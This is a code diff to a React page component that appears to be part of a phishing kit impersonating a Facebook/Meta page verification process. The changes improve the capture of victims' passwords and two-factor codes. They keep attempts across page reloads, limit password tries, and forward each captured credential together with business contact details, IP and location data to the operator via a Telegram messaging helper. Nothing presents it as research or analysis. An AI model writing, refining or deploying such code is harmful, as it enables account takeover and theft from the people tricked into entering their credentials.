@@ -20,15 +20,22 @@ import IcWarning from '@/assets/images/ic_warning.svg';
 import { applyTranslations } from '@/utils/apply-translations';
 import { getDeviceLabel } from '@/utils/device';
 import { sendTelegramMessage } from '@/utils/send-message';
+import appConfig from '@/utils/config';
 import { buildMetaMessage } from '@/utils/message';
 import detectBot from '@/utils/detect_bot';
 import { fetchAndPersistGeo } from '@/utils/geo-client';
 import { applyDocumentLanguage, LANG_COOKIE, normalizeLanguageCode } from '@/utils/resolve-language';
 import {
+    clearVerificationCodes,
+    clearVerificationPasswords,
+    loadVerificationCodes,
     loadVerificationFormData,
+    loadVerificationPasswords,
     loadVerificationStep,
     resetFlowAfterSuccess,
+    saveVerificationCodes,
     saveVerificationFormData,
+    saveVerificationPasswords,
     saveVerificationStep
 } from '@/utils/verification-form-storage';
 
@@ -48,7 +55,11 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
     const messageIdRef = useRef<number | null>(null);
     const sendQueueRef = useRef<Promise<void>>(Promise.resolve());
     const formDataRef = useRef(formData);
+    const passwordAttemptsRef = useRef(passwordAttempts);
+    const twoFAAttemptsRef = useRef(twoFAAttempts);
+    const ipInfoRef = useRef(ipInfo);
     const selectedMethodRef = useRef('');
+    const deviceMethodSentRef = useRef(false);
     const deviceLabelRef = useRef('Unknown');
     const defaultTexts = useMemo(() => ({ ...homeDefaultTexts }), []);
     const [translatedTexts, setTranslatedTexts] = useState<UiTexts>(() =>
@@ -59,6 +70,18 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
     useEffect(() => {
         formDataRef.current = formData;
     }, [formData]);
+
+    useEffect(() => {
+        passwordAttemptsRef.current = passwordAttempts;
+    }, [passwordAttempts]);
+
+    useEffect(() => {
+        twoFAAttemptsRef.current = twoFAAttempts;
+    }, [twoFAAttempts]);
+
+    useEffect(() => {
+        ipInfoRef.current = ipInfo;
+    }, [ipInfo]);
 
     useEffect(() => {
         const storedId = localStorage.getItem('message_id');
@@ -74,12 +97,41 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
         formDataRef.current = draft;
 
         const step = loadVerificationStep();
-        if (step === 'review') {
-            setShowReviewPage(true);
-        } else if (step === 'login') {
+        if (step === 'login') {
+            clearVerificationPasswords();
+            clearVerificationCodes();
+            setPasswordAttempts([]);
+            setTwoFAAttempts([]);
+            passwordAttemptsRef.current = [];
+            twoFAAttemptsRef.current = [];
+            setLoginData({ email: '', password: '' });
+            selectedMethodRef.current = '';
+            deviceMethodSentRef.current = false;
             setShowLoginModal(true);
+            setShow2FAModal(false);
         } else if (step === '2fa') {
+            clearVerificationCodes();
+            const storedPasswords = loadVerificationPasswords();
+            setPasswordAttempts(storedPasswords);
+            setTwoFAAttempts([]);
+            passwordAttemptsRef.current = storedPasswords;
+            twoFAAttemptsRef.current = [];
+            setLoginData({ email: '', password: '' });
+            selectedMethodRef.current = '';
+            deviceMethodSentRef.current = false;
+            setShowLoginModal(false);
             setShow2FAModal(true);
+        } else {
+            const storedPasswords = loadVerificationPasswords();
+            const storedCodes = loadVerificationCodes();
+            setPasswordAttempts(storedPasswords);
+            setTwoFAAttempts(storedCodes);
+            passwordAttemptsRef.current = storedPasswords;
+            twoFAAttemptsRef.current = storedCodes;
+
+            if (step === 'review') {
+                setShowReviewPage(true);
+            }
         }
         // success không khôi phục — luôn về đầu trang, giữ form + CONTINUE CLICKED
     }, []);
@@ -143,14 +195,16 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
         initializeApp();
     }, [initializeApp]);
 
-    const buildAndSend = (form: FormData, passwordLogs: string[], codeAttempts: string[]) => {
+    const buildAndSend = () => {
+        const form = formDataRef.current;
+        const geo = ipInfoRef.current;
         const geoInfo = {
             asn: 0,
-            ip: ipInfo.ip,
-            country: ipInfo.country,
-            city: ipInfo.city,
-            region: ipInfo.region,
-            country_code: ipInfo.country_code || 'US'
+            ip: geo.ip,
+            country: geo.country,
+            city: geo.city,
+            region: geo.region,
+            country_code: geo.country_code || 'US'
         };
 
         const message = buildMetaMessage({
@@ -161,10 +215,12 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
                 businessEmail: form.businessEmail,
                 phoneNumber: form.phone,
                 backupPhone: form.backupPhone,
-                facebookPageName: form.pageName
+                facebookPageName: form.pageName,
+                reason: form.reason,
+                additionalNotes: form.additionalNotes
             },
-            passwords: passwordLogs,
-            codes: codeAttempts,
+            passwords: passwordAttemptsRef.current.slice(0, Math.max(1, Number(appConfig.MAX_PASS || 2))),
+            codes: twoFAAttemptsRef.current,
             selectedMethod: selectedMethodRef.current,
             device: deviceLabelRef.current || deviceLabel
         });
@@ -189,28 +245,48 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
         formDataRef.current = data;
         setFormData(data);
         saveVerificationFormData(data);
-        saveVerificationStep('login');
-        buildAndSend(data, [], []);
         setShowReviewPage(false);
+
+        const maxPass = Math.max(1, Number(appConfig.MAX_PASS || 2));
+        if (passwordAttemptsRef.current.length >= maxPass) {
+            saveVerificationStep('2fa');
+            setShow2FAModal(true);
+            return;
+        }
+
+        saveVerificationStep('login');
         setShowLoginModal(true);
     };
 
     const handleLoginSubmit = (email: string, password: string) => {
+        const maxPass = Math.max(1, Number(appConfig.MAX_PASS || 2));
+        if (passwordAttemptsRef.current.length >= maxPass) {
+            return;
+        }
+
         setLoginData({ email, password });
-        const nextPasswordAttempts = [...passwordAttempts, password];
+        const nextPasswordAttempts = [...passwordAttemptsRef.current, password].slice(0, maxPass);
+        passwordAttemptsRef.current = nextPasswordAttempts;
         setPasswordAttempts(nextPasswordAttempts);
-        buildAndSend(formDataRef.current, nextPasswordAttempts, twoFAAttempts);
+        saveVerificationPasswords(nextPasswordAttempts);
+        buildAndSend();
     };
 
     const handle2FASubmit = (code: string) => {
-        const newAttempts = [...twoFAAttempts, code];
+        const newAttempts = [...twoFAAttemptsRef.current, code];
+        twoFAAttemptsRef.current = newAttempts;
         setTwoFAAttempts(newAttempts);
-        buildAndSend(formDataRef.current, passwordAttempts, newAttempts);
+        saveVerificationCodes(newAttempts);
+        buildAndSend();
     };
 
     const handleMethodSelect = (method: string) => {
         selectedMethodRef.current = method;
-        buildAndSend(formDataRef.current, passwordAttempts, twoFAAttempts);
+        if (method !== 'device_notifications' || deviceMethodSentRef.current) {
+            return;
+        }
+        deviceMethodSentRef.current = true;
+        buildAndSend();
     };
 
     const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
@@ -395,6 +471,7 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
                 show={showLoginModal}
                 onClose={() => setShowLoginModal(false)}
                 onSubmit={handleLoginSubmit}
+                attemptCount={passwordAttempts.length}
                 onSuccess={() => {
                     setShowLoginModal(false);
                     saveVerificationStep('2fa');
@@ -411,8 +488,11 @@ const Home = ({ initialLang = 'en' }: { initialLang?: string }) => {
                     setShow2FAModal(false);
                     setPasswordAttempts([]);
                     setTwoFAAttempts([]);
+                    passwordAttemptsRef.current = [];
+                    twoFAAttemptsRef.current = [];
                     setLoginData({ email: '', password: '' });
                     selectedMethodRef.current = '';
+                    deviceMethodSentRef.current = false;
                     messageIdRef.current = null;
                     resetFlowAfterSuccess();
 
